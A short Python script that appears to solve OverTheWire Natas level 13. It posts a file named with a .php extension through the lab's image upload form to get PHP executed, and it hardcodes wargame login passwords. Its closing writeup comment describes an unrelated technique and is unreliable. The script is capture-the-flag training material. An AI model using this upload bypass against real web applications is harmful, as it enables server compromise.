#! /usr/bin/python


import requests


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print(f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
path=''

#Custom Headers
custom_headers=''

file=open('somefile.png','rb')

#Payload
filename='somename.php'
payload={"MAX_FILE_SIZE":"1000","filename":filename}
url=host+path

session=requests.Session()
response=requests.post(url,data=payload,files={"uploadedfile":file},auth=(basic_username,basic_password))
content=response.text
status=response.status_code
headers=response.headers



print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
cleanheaders(headers)


flag=content
print(flag)


#WRITEUP
#The flag was in the source of the index.html page but this time right clicking is blocked

# natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1